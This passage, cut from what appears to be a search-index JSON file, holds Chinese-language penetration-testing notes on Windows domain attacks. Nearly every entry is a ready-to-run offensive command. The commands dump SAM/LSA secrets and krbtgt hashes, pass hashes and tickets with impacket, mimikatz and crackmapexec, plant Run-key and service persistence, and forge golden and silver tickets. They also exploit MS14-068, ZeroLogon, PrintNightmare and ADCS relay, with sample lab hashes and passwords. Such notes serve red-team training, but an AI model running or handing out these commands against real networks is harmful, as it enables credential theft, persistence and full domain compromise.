LOCAL","title":"\u5229\u7528NTDS\u8bfb\u53d6\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_41","text":"\u5bfc\u51fa\u6ce8\u518c\u8868 reg save HKLM\\SAM \"C:\\Windows\\Temp\\sam.save\" reg save HKLM\\SECURITY \"C:\\Windows\\Temp\\security.save\" reg save HKLM\\SYSTEM \"C:\\Windows\\Temp\\system.save\" # Remote dumping of SAM & LSA secrets secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET' # Remote dumping of SAM & LSA secrets (pass-the-hash) secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET' # Remote dumping of SAM & LSA secrets (pass-the-ticket) secretsdump.py -k 'DOMAIN/USER@TARGET' # Offline dumping of LSA secrets from exported hives secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL # Offline dumping of SAM secrets from exported hives secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL # Offline dumping of SAM & LSA secrets from exported hives secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL","title":"\u5229\u7528\u6ce8\u518c\u8868\u8bfb\u53d6\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#pthptk","text":"PTH\u5728kb2871997\u4e4b\u540e\u53ef\u80fd\u4f1a\u5931\u8d25\u3002\u4f46\u53ef\u4ee5\u4f7f\u7528\u673a\u5668\u7528\u6237\u6216\u57df\u7528\u6237\u7ed5\u8fc7\u3002","title":"PTH&amp;PTK"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ipcrpc","text":"","title":"IPC&amp;RPC\u76f8\u5173"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#impacket","text":"IPC\u8fde\u63a5 smbclient.py exp1/administrator:Aa123123..@192.168.14.100 \u8fde\u63a5\u4e4b\u540e\u9009\u62e9\u4e00\u4e2a\u8fde\u63a5\uff0cADMIN$\u9ed8\u8ba4\u5728Windows\u76ee\u5f55\u4e0b\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u6bcf\u4e2a\u78c1\u76d8\u90fd\u4f1a\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u8fde\u63a5\u3002 \u679a\u4e3e\u8ba1\u7b97\u673a\u7528\u6237 lookupsid.py exp1/administrator:Aa123123..@192.168.14.100 9999 samr\u4e5f\u53ef\u4ee5\u7528\u6765\u679a\u4e3e\u7528\u6237\uff0c\u8fd8\u9644\u5e26\u5b89\u5168\u7b56\u7565 samrdump.py exp1/administrator:Aa123123..@192.168.14.100 \u7ba1\u7406\u670d\u52a1 \u53ef\u4ee5\u81ea\u5efa\u670d\u52a1 services.py exp1/administrator:Aa123123..@192.168.14.100 list services.py exp1/administrator:Aa123123..@192.168.14.100 create -name test -display test -path \"cmd.exe /c start c:\\\\1.exe\" services.py exp1/administrator:Aa123123..@192.168.14.100 start -name test \u6ce8\u518c\u8868\u7ba1\u7406 reg.py exp1/administrator:Aa123123..@192.168.14.100 query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run \u6dfb\u52a0\u4e00\u4e2a\u81ea\u542f\u52a8\u9879\u76ee\uff0c\u53c2\u6570\u7684\u5927\u5c0f\u5199\u975e\u5e38\u654f\u611f reg.py exp1/administrator:Aa123123..@192.168.14.100 add -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v windowsupdate -vt REG_SZ -vd \"C:\\\\1.exe\" \u67e5\u4e00\u4e0b\u662f\u5426\u6dfb\u52a0\u6210\u529f reg.py exp1/administrator:Aa123123..@192.168.14.100 query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run -v windowsupdate \u53ef\u7528\u7684\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u5982\u4e0b reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v windowsupdate /t reg_sz /d \"C:\\Windows\\system32\\cmd.exe\" /f \u521b\u5efa\u670d\u52a1 C:\\Users\\ADmanager\\Desktop>sc \\1.1.1.1 create sangefor binpath= c:\\agent.exe start= auto sc c:\\1.exe \\\\1.1.1.1\\c$\\agent.exe \u8ba1\u5212\u4efb\u52a1 \u9ed8\u8ba4c\u76d8\u4e0b at \\\\1.1.1.1 16:33 1.exe SCHTASKS /Create /S 1.1.1.1 /U exp.com\\test /P \"Aa123123..\" /SC ONCE /ST 11:00 /TN test1 /TR c:\\1.exe /RU system","title":"impacket"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#wmi","text":"wmic /node:1.1.1.1 /user:exp1\\administrator /password:xxxx process call create c:\\edr.exe \u7528list\u67e5\u770b\u662f\u5426\u8fd0\u884c\u6210\u529f wmic /node:1.1.1.1 /user:exp1\\administrator /password:xxxx process where name=\"edr.exe\" get executablepath","title":"WMI\u8fdc\u7a0b\u521b\u5efa\u8fdb\u7a0b"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#sharpexec-","text":"sharpcollection \u6253\u5f00shell SharpExec.exe -m=wmiexec -i=192.168.14.100 -d=exp1.com -u=administrator -p=Aa123123.. \u6267\u884c\u547d\u4ee4 SharpExec.exe -m=wmi -i=192.168.14.100 -d=exp1.com -u=administrator -p=Aa123123.. -e=C:\\Windows\\System32\\cmd.exe -c=\"/c notepad.exe\" \u4e0a\u4f20\u6587\u4ef6 \u4e0a\u4f20\u540e\u4f1a\u81ea\u52a8\u8fd0\u884c SharpExec.exe -m=wmi -i=192.168.14.100 -d=exp1.com -u=administrator -p=Aa123123.. -f=\u672c\u5730\u8def\u5f84\\calc.exe -e=c:\\11.exe","title":"SharpExec-\u63a8\u8350"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#impacket_1","text":"\u8fd9\u51e0\u4e2a\u811a\u672c\u7684\u4f7f\u7528\u53c2\u6570\u90fd\u662f\u4e00\u6837\u7684\uff0cexe\u548cpy\u90fd\u662f\u4e00\u6837\u7684 wmiexec.py \u52a8\u9759\u4e00\u822c psexec.py \u52a8\u9759\u5927 dcomexec.py \u52a8\u9759\u5c0f smbexec.py \u52a8\u9759\u5927 atexec.py \u6709\u660e\u6587\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b python2 wmiexec.py administrator:Aa123123.@10.0.2.254 \u6709hash\u7684\u60c5\u51b5\u4e0b \u5de5\u4f5c\u7ec4 psexec.py -hashes b9466d8c3afe060325ad3b83fa6627c7:379529bb14c7cc48eb314445c3529f49 workgroup/administrator@192.168.80.5 \u57df python2 wmiexec.py exp/administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c \u6709ase256\u7684\u60c5\u51b5 python2 wmiexec.py exp/administrator@10.0.2.5 -aesKey a38e70861856e2f4c98134b5288383c7992e63c5031a9540e636d2cafa9e88d6","title":"impacket\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mimikatz_1","text":"ntlm\u53ef\u6539\u4e3arc4\u3001aes256\u3001aes128 sekurlsa::pth /user:win10 /domain:test.local /ntlm:6a6293bc0c56d7b9731e2d5506065e4a \u8fdc\u7a0b\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b mimikatz sekurlsa::pth /user:admin /domain:ABENSON /ntlm:b660e61adc0aec1fe34711e6226fcc8c /run:\"cmd -w hidden\" \u5077\u53d6\u8fdb\u7a0bTOKEN steal_token PID","title":"mimikatz\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#wmi-pth","text":"\u4f7f\u7528wmiexec-RegOut\u89e3\u51b3 python3 wmipersist-Modify.py -hashes :b660e61adc0aec1fe34711e6226fcc8c exp.com/administrator@10.1.1.1 'ipconfig -all' -with-output \u4f7f\u7528wmiexec-Pro\u89e3\u51b3","title":"WMI PTH\u6709\u6740\u6bd2\u62e6\u7684\u89e3\u51b3\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#wmiexe","text":"python3 wmi_reg_exec.py administrator@test.com -H xxxxxxx-f mimikatz.exe -a '\"coffie\" \"exit\"' python3 wmi_reg_exec.py administrator:abc123@dc -f aaa.exe","title":"\u901a\u8fc7WMI\u5199\u5165\u6ce8\u518c\u8868\u6765\u6267\u884cexe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dcerpc","text":"https://github.com/Mr-Un1k0d3r/SCShell \u6709bof\u63d2\u4ef6 SCShell.exe target service payload domain username password SCShell.exe 192.168.197.131 XblAuthManager \"C:\\windows\\system32\\cmd.exe /C C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\payload.csproj\" . administrator Password mimikatz\u4f7f\u7528\u6253\u5f00cmd\u76f4\u63a5\u8fde sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce","title":"DCERPC\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_42","text":"CS\u3001crackmap\u90fd\u53ef\u4ee5\u6279\u91cfPTH\uff0cCS\u76f4\u63a5\u70b9\u70b9\u70b9\u5c31\u884c\u4e86","title":"\u6279\u91cf\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#crackmapexec","text":"\u8fd9\u4e2a\u5de5\u5177\u7684\u601d\u8def\u4f5c\u7528\u662f\u76f4\u63a5\u547d\u4ee4\u6267\u884c\u6216\u4f20\u9a6c SMB\u670d\u52a1\u63a2\u6d4b crackmapexec smb 192.168.3.0/24 \u67e5\u770b\u5bc6\u7801\u7b56\u7565 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --pass-pol hashdump crackmapexec smb 10.0.2.5 -u administrator -p '123123' --sam \u679a\u4e3e\u7ec4 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --local-groups \u57fa\u4e8esmbexec\u6267\u884c crackmapexec smb 10.0.2.5 -u administrator -p '123123' --exec-method smbexec -x 'whoami' \u57fa\u4e8edcom\u6267\u884c crackmapexec smb 10.0.2.5 -u administrator -p '123123' --exec-method mmcexec -x 'whoami' \u57fa\u4e8eatexec\u6267\u884c crackmapexec smb 10.0.2.5 -u administrator -p '123123' --exec-method wmiexec -X 'whoami' \u5229\u7528hash\u4f20\u9012 crackmapexec smb 10.0.2.5 -u administrator -H '579110c49145015c47ecd267657d3174' --exec-method atexec -x 'whoami' \u4e0a\u4f20\u6587\u4ef6 \u9ed8\u8ba4\u5230C\u76d8\uff0c\u6e90-\u76ee\u6807 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --put-file 1.bin 32.bin \u67e5\u770b\u7535\u8111\u7684\u76d8\u7b26 crackmapexec smb 10.0.2.5 -u administrator -p '123123' --disks","title":"crackmapexec"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#powersploit","text":"Invoke-WMIexec Invoke-SMBExec \u547d\u4ee4\u683c\u5f0f \u6267\u884c Invoke-WMIExec -Target 10.0.2.5 -Domain workgroup -Username uac -Hash 36aa83bdcab3c9fdaf321ca42a31c3fc -Command \"calc\" -verbose \u68c0\u67e5 Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0","title":"PowerSploit"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#win32_processcreatepth","text":"360LINTON\u5199\u7684vbs\u5de5\u5177\uff0c\u65e0\u9700445 \u4e3b\u8981\u529f\u80fd\uff1a1\u3001\u547d\u4ee4\u6267\u884c\uff1b2\u3001\u6587\u4ef6\u4e0a\u4f20\uff1b3\u3001\u6587\u4ef6\u4e0b\u8f7d \u6709\u547d\u4ee4\u56de\u663e\u6267\u884c\u65b9\u5f0f > cscript WMIHACKER_0.6.vbs /cmd 1.1.1.1 administrator \"Password!\" \"systeminfo\" 1 \u65e0\u547d\u4ee4\u56de\u663e > cscript WMIHACKER_0.6.vbs /cmd 1.1.1.1 administrator \"Password!\" \"systeminfo > c:\\1.txt\" 0 \u6a21\u62dfshell\u6a21\u5f0f > cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator \"Password!\" \u6587\u4ef6\u4e0a\u4f20-\u590d\u5236\u672c\u673acalc.exe\u5230\u8fdc\u7a0b\u4e3b\u673ac:\\calc.exe > cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator \"Password!\" \"c:\\windows\\system32\\calc.exe\" \"c:\\calc\" \u6587\u4ef6\u4e0b\u8f7d-\u4e0b\u8f7d\u8fdc\u7a0b\u4e3b\u673acalc.exe\u5230\u672c\u5730c:\\calc.exe > cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator \"Password!\" \"c:\\calc\" \"c:\\windows\\system32\\calc.exe\"","title":"\u7ed5\u8fc7Win32_Process.create\u7684PTH"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#wmipth","text":"lengyi\u5199\u7684\u5de5\u5177 \u4fee\u6539js\u6587\u4ef6\u4e2d\u7684\u547d\u4ee4 PS C:\\Users\\Administrator\\Desktop> New-WMIShell -Target '192.168.2.115' -Username 'administrator' -Password 'abc123!' -ProcessName 'notepad.exe' -JScriptPath C:\\Users\\Administrator\\Desktop\\payload.js -FilterName 'sdqwsda' -ConsumerName 'sdqwsda'","title":"\u4f7f\u7528wmi\u4e8b\u4ef6\u8ba2\u9605\u7684PTH"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#hashrdp","text":"win7\u6d4b\u8bd5\u5931\u8d25 sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:579110c49145015c47ecd267657d3174 \"/run:mstsc.exe /restrictedadmin\"","title":"\u4f7f\u7528hash\u767b\u5f55RDP"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ptt","text":"","title":"PTT"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_43","text":"kekeo\u7533\u8bf7\u7968\u636e kekeo tgt::ask /user:xx /domain:xxx /ntlm:xxx kekeo\u5bfc\u5165\u7968\u636e kekeo kerberos::ptt xxx.xxx cmd\u65b9\u5f0f cmd:>klist \u67e5\u770b\u7968\u636e cmd:>klist purge \u5220\u9664\u7968\u636e mimikatz\u65b9\u5f0f mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u673a\u5668\u4e2d\u6240\u6709\u51ed\u8bc1 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptt \u7968\u636e\u6587\u4ef6 //\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d \u7968\u636e\u7684\u8f6c\u6362 \u7528mimikatz\uff0ckekeo\uff0crubeus\u751f\u6210\u7684\u51ed\u636e\u662f\u4ee5 .kirbi \u540e\u7f00\u7684\u3002impacket \u751f\u6210\u7684\u51ed\u636e\u7684\u540e\u7f00\u662f .ccache \u3002 \u4f7f\u7528ticket_converter.py\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\u3002 \u4f7f\u7528KrbCredExport\u53ef\u4ee5\u5c06ccache\u8f6c\u6362\u4e3akirbi","title":"\u7968\u636e\u64cd\u4f5c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_44","text":"\u5236\u4f5c\u9ec4\u91d1\u7968\u636e\u7684\u57fa\u7840\u662f\u83b7\u53d6\u4e86krbtgt\u8d26\u6237\u7684hash\u3002 \u901a\u8fc7\u5404\u79cd\u529e\u6cd5\u5bfc\u51fakrbtgt\u7684hash\uff0c\u7136\u540e\u5236\u4f5c\u7968\u636e\u3002 \u5236\u4f5c\u7968\u636e\uff0c\u53ef\u4ee5\u6307\u5b9a/rc4\u3001aes256\u3001aes128 kerberos::golden /admin:administrator /domain:exp1.com /sid:S-1-5-21-2245962460-1542597299-2684170513 /krbtgt:f123d13e88766c87ec8fbddd01a4a325 /ticket:admin.tck \u6ce8\u5165\u7968\u636e kerberos::/ptt 1.tck","title":"\u9ec4\u91d1\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_45","text":"\u767d\u94f6\u7968\u636e\u4f7f\u7528\u673a\u5668\u8d26\u6237\u7684ntlm hash\uff0c\u4f7f\u7528cifs\u6587\u4ef6\u670d\u52a1\uff0c\u4ec5\u80fd\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1\uff0c\u4e0d\u9650\u4e8ecifs\u6587\u4ef6\u670d\u52a1 kerberos::golden /domain:test.local /sid:S-1-5-21-514356739-3204155868-1239341419 /target:dc.test.local /service:cifs /rc4:9150e40e4ec936a15baf384ca382a3df /user:dc$ /ptt","title":"\u767d\u94f6\u7968\u636e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_46","text":"","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ms14-068","text":"\u57fa\u4e8ePAC\u4ea7\u751f\u7684\u6f0f\u6d1e","title":"MS14-068"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#windows","text":"MS14-068.exe -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.","title":"windows\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#linux","text":"MS14-068.py -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123. \u751f\u6210\u7968\u636e\u540e export KRB5CCNAME=xx.krb psexec.py exp.com/cs@dc.exp.com -k -no-pass -debug -dc-ip 10.0.2.254 -target-ip 10.0.2.254","title":"Linux\u4e0a\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#keko","text":"exploit::ms14068 /domain:exp.com /user:cs /password:Aa123123. /ptt","title":"keko\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-2020-1472-zerologon","text":"ZeroLogon\u901a\u8fc7\u7f6e\u7a7aDC\u673a\u5668\u7528\u6237\u7684\u5bc6\u7801\u6765\u6253DC","title":"CVE-2020-1472 (ZeroLogon)"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#python","text":"\u7f6e\u7a7aDC\u673a\u5668\u7528\u6237\u5bc6\u7801 python3 cve-2020-1472-exploit.py WIN-I8E0L339L6E 10.0.2.254 \u8bfb\u53d6DC\u7684hash python3 secretsdump.py exp.com/WIN-I8E0L339L6E\\$@10.0.2.254 -just-dc -no-pass PTH\uff0cPTK\u8fde wmiexec.py exp/administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c \u5feb\u901f\u5229\u7528 zerologon-Shot-main","title":"python\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mimikatz_2","text":"\u6f0f\u6d1e\u68c0\u6d4b lsadump::zerologon /target:WIN-I8E0L339L6E.exp.com /account:DC$ \u7f6e\u7a7a lsadump::zerologon /target:WIN-I8E0L339L6E.exp.com /account:WIN-I8E0L339L6E$ /exploit \u67e5\u770b\u7968\u636e lsadump::dcsync /user:krbtgt /domain:exp.com \u751f\u6210\u9ec4\u91d1\u7968\u636e lsadump::dcsync /domain:exp.com /dc:WIN-I8E0L339L6E.exp.com /user:krbtgt /authuser:WIN-I8E0L339L6E$ /authdomain:exp /authpassword: /authntlm impacket\u751f\u6210\u9ec4\u91d1\u7968\u636e goldenPac.py test.local/jack:123456!@#@WIN-I8E0L339L6E.exp.com","title":"mimikatz\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#powershell","text":"Invoke-ZeroLogon.ps1 \u653b\u51fb Invoke-ZeroLogon DC.exp.com","title":"Powershell\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_47","text":"\u8bfb\u53d6DC\u6ce8\u518c\u8868 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save \u8bfb\u539f\u5148\u673a\u5668\u7528\u6237HASH secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u8fd8\u539fHASH python3 reinstall_original_pw.py WIN-I8E0L339L6E 10.0.2.254 13adade6efd67a927131a3149a7693c4 exp.com/WIN-I8E0L339L6E\\$@10.0.2.254 -just-dc -no-pass","title":"\u6062\u590d\u57df\u63a7\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-2021-1675-printnightmare","text":"\u901a\u8fc7print spooler\u670d\u52a1\u7684\u6f0f\u6d1e","title":"CVE-2021-1675 \uff08printnightmare\uff09"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mimikatz_3","text":"\u9700\u4fdd\u969cUNC\u8bbf\u95ee\u53ef\u4ee5\u533f\u540d printnightmare /try:10 misc::printnightmare /server:dc2.exp2.com /library:\\\\pc2.exp2.com\\share\\dll.dll misc::printnightmare /server:dc.exp1.com /library:\\\\pc1.exp.com\\q\\aa.dll /authuser:w1 /authdomain:exp2.com /authpassword:Aa123123 /u","title":"mimikatz\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#python_1","text":"\u8f6c\u6210\u4e86exe ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' Windows\u5f00\u542f\u533f\u540dsmb \u9700\u8981\u63d0\u6743\u81f3system mkdir C:\\share icacls C:\\share\\ /T /grant Anonymous logon:r icacls C:\\share\\ /T /grant Everyone:r New-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone' REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f REG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f Linux\u5f00\u542f\u533f\u540dsamba ~~\u5b89\u88c5samba\u670d\u52a1~~ \u76f4\u63a5\u4f7f\u7528impacket\u7684smbserver /etc/samba/samba.conf [global] workgroup = workgroup server string = test netbios name = MZ security = user map to guest = Bad User smb ports = 445 log file = /var/log/samba/log.%m max log size = 5 [smb] comment = Samba browseable = yes writeable = yes public = yes path = /tmp/ read only = no guest ok = yes","title":"python\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#adcs-2021-7","text":"\u5411DC\u53d1\u9001\u8bf7\u6c42\uff0c\u4f7fDC\u5411ADCS\u8fdb\u884c\u5f3a\u5236\u8ba4\u8bc1\uff0c\u5c06DC\u7684\u8ba4\u8bc1\u8bf7\u6c42\u4e2d\u7ee7\u5230ADCS\uff0c\u83b7\u53d6hash\u3002 \u9700\u8981\u6539\u52a8\u4e00\u4e0bimpacket\u4e0b\u7684\u4e09\u4e2a\u6587\u4ef6\uff0c\u4e4b\u540e\u91cd\u65b0\u8fd0\u884csetup impacket/impacket/examples/ntlmrelayx/utils/config.py impacket/impacket/examples/ntlmrelayx/attacks/httpattack.py impacket/examples/ntlmrelayx.py https://github.com/SecureAuthCorp/impacket/pull/1101/files","title":"ADCS\u4e2d\u7ee7\uff08\u57df\u8bc1\u4e66\u7ba1\u7406\u670d\u52a1\uff09 2021-7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#python_2","text":"\u4f7f\u7528ADCS\u65b9\u5f0f\u76d1\u542c\u4e2d\u7ee7 python3 ntlmrelayx.py -t https://192.168.52.100/certsrv/certfnsh.asp -smb2support --adcs \u5982\u679c\u8bc1\u4e66\u670d\u52a1\u5668\u662f\u57df\u63a7\uff0c\u9700\u8981\u6307\u5b9a\u57df\u63a7\u53c2\u6570\u3002 python3 ntlmrelayx.py -t https://192.168.14.100/Certsrv/certfnsh.asp -smb2support --adcs --template \"DomainController\" \u9700\u8981\u5f00\u542f\u4e86\u8bc1\u4e66\u670d\u52a1\u7684web\u8bbf\u95ee \u5411DC\u53d1\u9001\u8bf7\u6c42 python3 dementor.py -u pc1 -p Aa123123 -d exp1.com DC python Petitpotam.py 192.168.52.129 192.168.52.100 -u pc1 -p Aa123123","title":"python\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mimikatz_4","text":"\u76d1\u542c\u548c\u4e0a\u9762\u4e00\u6837\u7684 misc::spooler /server:dc.exp1.com /connect:192.168.52.129 /authuser:pc1@exp1.com /authpassword:Aa123123 /u misc::efs /server:dc.exp1.com /connect:192.168.52.129 /noauth","title":"mimikatz\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#cve-202226923-adcs","text":"","title":"CVE-2022\u201326923 (ADCS\u6f0f\u6d1e\u6743\u9650\u63d0\u5347)"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_48","text":"ADCS\u5728\u53d1\u8bc1\u4e66\u65f6\u53ea\u6821\u68c0\u8bf7\u6c42\u7684dnshostname\u53c2\u6570\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7ms-DS-MachineAccountQuota\u65b0\u5efa\u4e00\u4e2a\u865a\u62df\u673a\u5668\u5e76\u66f4\u6539\u865a\u62df\u673a\u5668\u7684dnshostname\u4e3a\u57df\u63a7\u7684\uff0c\u540e\u7eed\u5728\u7533\u8bf7\u8bc1\u4e66\u65f6\u4fbf\u7533\u8bf7\u5230\u4e86\u57df\u63a7\u7684\u8bc1\u4e66\u3002","title":"\u539f\u7406"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_49","text":"https://github.com/CravateRouge/bloodyAD \u9700\u8981\u4e00\u4e2a\u57df\u5185\u7528\u6237\uff0c\u9700\u8981\u77e5\u9053ADCS\u662f\u54ea\u4e00\u53f0\u3002 